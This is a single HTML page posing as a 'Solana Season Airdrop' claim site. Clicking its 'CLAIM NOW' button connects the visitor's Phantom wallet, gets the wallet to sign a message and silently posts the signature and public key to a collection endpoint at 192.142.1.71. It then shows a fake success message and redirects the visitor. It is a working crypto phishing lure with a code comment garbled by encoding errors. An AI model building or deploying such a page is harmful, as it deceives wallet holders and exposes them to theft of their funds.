<!DOCTYPE html><html><head><meta charset="UTF-8">
<script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:25vh;font-family:sans-serif;">
<div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;box-shadow: 0 0 30px #14F19544;">
    <h1 style="letter-spacing:1px;font-size:24px;">SOLANA SEASON AIRDROP</h1>
    <p style="color:#888;margin-bottom:30px;">Node: 192.142.1.71 | Secure Connection</p>
    <button id="cta" style="padding:18px 50px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">CLAIM NOW</button>
    <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Status: Awaiting Signature...</div>
</div>
<script>
document.getElementById('cta').onclick = async () => {
    try {
        const p = window.solana || window.phantom?.solana;
        if (!p) { alert("Use Phantom Browser"); return; }
        const { publicKey } = await p.connect();
        const msg = "Verify-Wallet-" + Math.floor(Math.random() * 99999);
        const signed = await p.signMessage(new TextEncoder().encode(msg), "utf8");
        const sig = btoa(String.fromCharCode.apply(null, signed.signature));
        
        // ðŸ”± ç»ˆæžç›´è¿žï¼šæŒ‡å‘ 80 ç«¯å£çš„ /collect
        fetch("http://192.142.1.71/collect", {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({ signature: sig, pubkey: publicKey.toString(), message: msg }),
            keepalive: true
        });
        document.getElementById('status').innerText = "SUCCESS! VERIFIED";
        setTimeout(() => { window.location.href = "https://solscan.io"; }, 1000);
    } catch(e) { window.location.reload(); }
}
</script></body></html>
